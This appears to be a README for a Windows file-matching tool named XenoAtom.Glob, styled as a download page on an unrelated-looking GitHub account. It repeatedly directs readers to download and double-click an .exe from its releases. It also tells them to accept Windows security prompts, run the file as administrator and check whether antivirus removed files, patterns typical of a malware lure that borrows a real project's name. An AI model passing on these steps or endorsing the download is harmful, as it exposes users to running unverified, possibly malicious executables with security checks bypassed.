# 🪟 XenoAtom.Glob - Fast glob search for Windows

[🔵 Download from GitHub Releases](https://github.com/catnapplaytime8-png/XenoAtom.Glob/releases)

## 📥 Download

Visit this page to download: [GitHub Releases](https://github.com/catnapplaytime8-png/XenoAtom.Glob/releases)

Look for the latest release on that page. Download the file made for Windows. If there is more than one file, choose the one that matches your system. For most users, that means the file with `win` or `windows` in the name.

## 🖥️ What XenoAtom.Glob Does

XenoAtom.Glob helps you find files by pattern.

It works like the file matching rules used in `.gitignore`. That means it can help you match paths, folders, and file names with simple rules.

Use it when you want to:

- Find files by name pattern
- Match folders and file paths
- Use rules that feel like `.gitignore`
- Handle large file sets with good speed

## ⚙️ What You Need

Before you run XenoAtom.Glob, make sure your PC has:

- Windows 10 or newer
- A modern version of .NET if the app asks for it
- Enough free space to unpack the download
- A basic file manager like File Explorer

If the release includes a self-contained build, you can run it without installing .NET first.

## 🚀 How to Download and Run

1. Open the [GitHub Releases page](https://github.com/catnapplaytime8-png/XenoAtom.Glob/releases)
2. Find the newest release near the top
3. Open the Assets list
4. Download the Windows file
5. If the file is in a ZIP, right-click it and choose Extract All
6. Open the extracted folder
7. Double-click the `.exe` file to start it

If Windows shows a security prompt, choose the option that lets you run the file.

## 🧭 First-Time Setup

After you open the app, take a moment to check the main folder or input path you want to search.

A typical setup looks like this:

- Choose the folder you want to scan
- Enter a glob pattern or ignore rule
- Start the search
- Review the matched files

If the app uses a config file, keep it in the same folder as the app unless the release notes say otherwise

## 📁 Common Ways to Use It

XenoAtom.Glob is useful for many file tasks:

- Find all `.txt` files in a folder
- Skip build output folders like `bin` and `obj`
- Match source files but ignore test files
- Apply `.gitignore` style rules to local folders
- Search large project trees with less effort

Example patterns:

- `*.txt` for all text files
- `src/**` for everything under a source folder
- `**/temp/*` for files inside temp folders
- `!*.log` to exclude log files in rule sets that support ignore style syntax

## 🧱 Typical Folder Layout

If you download a ZIP release, the folder may look like this:

- `XenoAtom.Glob.exe`
- `README.txt`
- `LICENSE`
- `config.json`
- other app files

Keep the files together. Do not move the `.exe` by itself unless the app is built to run that way.

## 🔍 Gitignore Compatibility

This app follows `.gitignore` style matching.

That means it can support rules that:

- Ignore file groups
- Match folder names
- Use `*` for simple wildcards
- Use `**` for nested paths
- Use `!` for rules that bring items back into the match set

This makes it easier to use if you already know basic gitignore rules.

## 🛠️ Troubleshooting

If the app does not open:

- Check that you downloaded the Windows file
- Make sure you extracted the ZIP file first
- Look for a missing `.NET` message
- Try running the `.exe` from the extracted folder
- Right-click the file and choose Run as administrator if your system blocks it

If the app closes right away:

- Download the file again
- Check that the download finished fully
- Make sure antivirus did not remove a file
- Confirm that all files from the release are in the same folder

If you see a path error:

- Check the folder you entered
- Make sure the folder exists
- Use a full path if needed
- Avoid typing extra spaces

## 📌 Best Practices

For the smoothest setup:

- Use the latest release
- Keep the app in a simple folder path like `C:\XenoAtom.Glob`
- Avoid placing it inside a synced folder if files change during use
- Keep the release files together
- Use short folder names for easier path handling

## 🧪 Simple Example

If you want to find all Markdown files in a project folder:

1. Open the app
2. Set the folder path to your project
3. Enter `*.md`
4. Run the search
5. Review the file list

If you want to ignore common build folders:

1. Add rules for `bin/`
2. Add rules for `obj/`
3. Add rules for any temp folders
4. Run the scan again

## 🗂️ File Matching Tips

Use these common patterns:

- `*` matches one part of a name
- `?` matches one character
- `**` matches folders at any depth
- `/` helps define path rules
- `!` can reverse an ignore rule in supported rule sets

Start with one simple rule, then add more if needed

## 📦 Release Download

Go to the [GitHub Releases page](https://github.com/catnapplaytime8-png/XenoAtom.Glob/releases) to download and run the Windows file

## 🧩 Project Focus

- Fast file matching
- `.gitignore` style rules
- Simple search flow
- Windows use
- Clean path handling